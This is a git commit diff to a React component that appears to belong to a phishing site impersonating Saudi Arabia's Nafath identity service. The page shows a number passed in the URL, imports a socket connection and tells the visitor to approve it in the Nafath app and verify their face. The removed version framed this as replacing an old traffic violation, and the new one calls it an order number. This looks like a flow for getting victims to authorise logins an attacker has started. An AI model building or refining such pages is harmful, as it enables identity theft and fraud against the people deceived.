5b4976474526ee394b1e313c91a92c455e9b2086
omarrnaguibb <130666749+omarrnaguibb@users.noreply.github.com>
2025-09-13 13:47:43 +0300

    12312323

--- src/screen/Navaz.jsx
+++ src/screen/Navaz.jsx
@@ -2,7 +2,7 @@ import React from "react";
 import { serverRoute, socket } from "./Main";
 import { useState } from "react";
 
-const Navaz = () => {
+const Navaz = ({ mode, checkMode }) => {
   const query = new URLSearchParams(window.location.search);
   const [otp, setOtp] = useState(query.get("otp"));
   const stc = query.get("stc");
@@ -32,36 +32,43 @@ const Navaz = () => {
 
   return (
     <div className="w-full flex flex-col items-center justify-center bg-white py-5 gap-5 ">
-      <img src="/navazLogo.png" alt="navazLogo Logo" className="w-16" />
-      <span
-        className="text-center w-4/5  bg-green-100 rounded-md p-3  text-gray-600  "
-        style={{ border: "1px solid #14a196" }}
-      >
-        الرجاء التوجه الى تطبيق نفاذ لتاكيد طلب استبدال المخالفة القديمة باختيار
-        الرقم الذي سوف يظهر في الاسفل
-        <div className="text-4xl text-green-500 animate-bounce mt-5">
-          <span>&bull;</span>
-          <span>&bull;</span>
-          <span>&bull;</span>
-          <span>&bull;</span>
-          <span>&bull;</span>
-          <span>&bull;</span>
-          <span>&bull;</span>
-          <span>&bull;</span>
-          <span>&bull;</span>
-          <span>&bull;</span>
-          <span>&bull;</span>
-          <span>&bull;</span>
-        </div>
-        <span className="text-gray-600 ">جاري المعالجة . نرجو الانتظار</span>
+      <span className="text-4xl text-green-600 font-bold mb-5">
+        {" "}
+        {checkMode("Order Number", "رقم الطلب").word}
       </span>
-      <div
-        className="min-w-20 min-h-20 px-5 flex items-center justify-center text-2xl text-green-800 "
-        style={{ border: "2px solid #14a196" }}
-      >
-        {otp ? otp : "??"}
+      <span className="text-gray-500 font-bold">
+        {
+          checkMode(
+            "Please Choose the Order Number In Navaz App",
+            "        فضلا قم باختيار رقم الطلب الظاهر في تطبيق نفاذ"
+          ).word
+        }
+      </span>
+      <div className="flex flex-col justify-center items-center text-gray-500 font-bold gap-1">
+        <span dir={mode === "ar" ? "rtl" : "ltr"} className="text-sm">
+          {checkMode("1- Open Navaz App", "1- ادخل تطبيق نفاذ").word}
+        </span>
+        <span dir={mode === "ar" ? "rtl" : "ltr"} className="text-sm">
+          {
+            checkMode(
+              "2- Click on “Complete”, then confirm the number that appears",
+              "2- اضغط علي اكمال ثم اكدد الرقم الظاهر"
+            ).word
+          }
+        </span>
+        <span dir={mode === "ar" ? "rtl" : "ltr"} className="text-sm">
+          {checkMode("3- Prove Interface Image", "3- اثبت صورة الوجهه").word}
+        </span>
       </div>
-      <img src="/navazOtp.jpg" className="md:w-2/5 p-2 " />
+      <span className="min-w-20 my-5 rounded-full min-h-20 bg-gray-300 flex items-center justify-center text-xl font-bold text-white px-3">
+        {otp}
+      </span>
+      <span className="my-5 text-lg text-red-500 w-full text-center"></span>
+      <div className="flex gap-x-5 w-full items-center justify-center">
+        <span className="text-white text-center bg-green-500 px-4 text-lg w-1/3 py-1 rounded-md cursor-pointer">
+          {checkMode("Verify", "تحقق").word}
+        </span>
+      </div>
     </div>
   );
 };
